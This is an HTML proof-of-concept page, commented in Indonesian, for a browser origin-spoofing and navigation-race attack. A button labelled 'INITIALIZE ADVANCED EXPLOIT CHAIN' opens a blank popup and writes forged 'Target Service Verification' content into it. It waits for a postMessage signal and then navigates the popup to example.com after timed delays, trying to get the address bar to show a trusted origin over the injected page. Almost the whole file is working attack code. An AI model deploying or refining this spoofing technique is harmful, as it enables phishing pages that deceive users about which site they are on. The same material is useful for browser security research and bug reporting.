<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
    <title>Robust Origin Spoofing & Navigation Race PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #0b0e14;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f0f6fc;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .container { text-align: center; max-width: 600px; padding: 20px; }
      button {
        padding: 18px 36px;
        font-size: 16px;
        font-weight: 600;
        background: #da3633;
        color: #fff;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
        transition: transform 0.1s, background 0.2s;
      }
      button:active { background: #b62324; transform: scale(0.98); }
      .info {
        margin-top: 20px;
        font-size: 13px;
        color: #8b949e;
        font-family: monospace;
        word-break: break-all;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <button id="startBtn">INITIALIZE ADVANCED EXPLOIT CHAIN</button>
      <div class="info" id="statusInfo">Status: Ready for interaction.</div>
    </div>

    <script>
      document.getElementById("startBtn").onclick = function () {
        const statusInfo = document.getElementById("statusInfo");
        statusInfo.innerText = "Status: Opening isolated window context...";
        this.style.display = "none";

        // Membuka jendela baru dengan referensi kosong
        const targetWindow = window.open("about:blank", "_blank");

        if (!targetWindow) {
          statusInfo.innerText = "Status: Failed - Popup blocked by browser policy.";
          return;
        }

        try {
          statusInfo.innerText = "Status: Injecting transitional payload...";

          // Payload HTML tiruan untuk menguji ketahanan render awal
          const payloadHTML = `
            <!DOCTYPE html>
            <html>
            <head>
              <title>Target Service Verification</title>
              <style>
                body {
                  margin: 0; background: #ffffff; color: #1d1d1f;
                  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                  display: flex; align-items: center; justify-content: center;
                  height: 100vh; text-align: center;
                }
                .box { padding: 40px; }
                h1 { font-size: 40px; color: #d70015; margin-bottom: 10px; }
                p { font-size: 22px; color: #0066cc; }
              </style>
            </head>
            <body>
              <div class="box">
                <h1>SECURITY CONTEXT TEST</h1>
                <p>Evaluating state transition & address bar stability.</p>
              </div>
              <script>
                // Mengirim sinyal balik ke opener setelah DOM siap untuk mengurangi ketergantungan pada timeout statis
                window.addEventListener('DOMContentLoaded', () => {
                  if (window.opener) {
                    window.opener.postMessage({ status: 'DOM_READY' }, '*');
                  }
                });
              <\/script>
            </body>
            </html>
          `;

          // Menulis payload langsung ke dokumen target
          targetWindow.document.open();
          targetWindow.document.write(payloadHTML);
          targetWindow.document.close();

          statusInfo.innerText = "Status: Waiting for DOM readiness signal...";

          // Listener untuk menerima konfirmasi dari jendela anak
          const messageHandler = (event) => {
            if (event.data && event.data.status === 'DOM_READY') {
              window.removeEventListener('message', messageHandler);
              statusInfo.innerText = "Status: DOM ready received. Triggering target navigation race...";

              // Jeda mikro untuk menguji celah transisi commit origin
              setTimeout(() => {
                try {
                  // Mengarahkan ke URL eksternal yang diuji ketahanannya
                  targetWindow.location.href = "https://example.com";
                  statusInfo.innerText = "Status: Navigation sequence completed successfully.";
                } catch (navErr) {
                  statusInfo.innerText = "Status: Navigation blocked: " + navErr.message;
                }
              }, 400); // Waktu tunda yang lebih ketat dibanding versi sebelumnya
            }
          };

          window.addEventListener('message', messageHandler);

          // Fallback timer jika sinyal postMessage gagal diterima dalam waktu tertentu
          setTimeout(() => {
            window.removeEventListener('message', messageHandler);
            try {
              targetWindow.location.href = "https://example.com";
              statusInfo.innerText = "Status: Fallback navigation triggered.";
            } catch (err) {
              console.debug("Fallback restricted:", err.message);
            }
          }, 1500);

        } catch (e) {
          statusInfo.innerText = "Status: Execution error - " + e.message;
        }
      };
    </script>
  </body>
</html>
